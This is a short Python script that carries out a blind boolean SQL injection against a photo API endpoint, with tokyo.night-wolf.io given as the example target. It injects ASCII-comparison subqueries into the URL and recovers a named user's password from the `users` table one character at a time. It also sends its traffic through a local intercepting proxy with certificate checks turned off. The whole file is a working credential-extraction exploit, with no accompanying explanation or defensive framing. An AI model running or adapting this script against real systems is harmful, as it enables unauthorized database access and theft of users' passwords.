
import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# url = https://tokyo.night-wolf.io:9002/api/photo/

def sqli_passwordFor(url):
    password_extracted = ""
    for i in range(1, 60):
        for j in range(1, 256):
            #sqli_payload = f" 24 OR ('%s'= (SELECT (SELECT ascii(SUBSTRING(`name`,%s,1))) from `users` WHERE `email`='giangpt@gmail.com')); --  limit 1" % (j, i)
            sqli_payload = f" 24 OR ('%s'= (SELECT (SELECT ascii(SUBSTRING(`password`,%s,1))) from `users` WHERE `email`='giangpt@gmail.com')); --  limit 1" % (j, i)
            encoded_payload = urllib.parse.quote(sqli_payload)
            modified_url = f"{url}{encoded_payload}"
            r = requests.get(modified_url, verify=False, proxies=proxies)
            if "anna" in r.text:
                # sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s https://tokyo.night-wolf.io:9002/api/photo/' % sys.argv[0])
        return
    url = sys.argv[1]
    print("[+] Retrieving password...")
    sqli_passwordFor(url)

if __name__ == '__main__':
    main()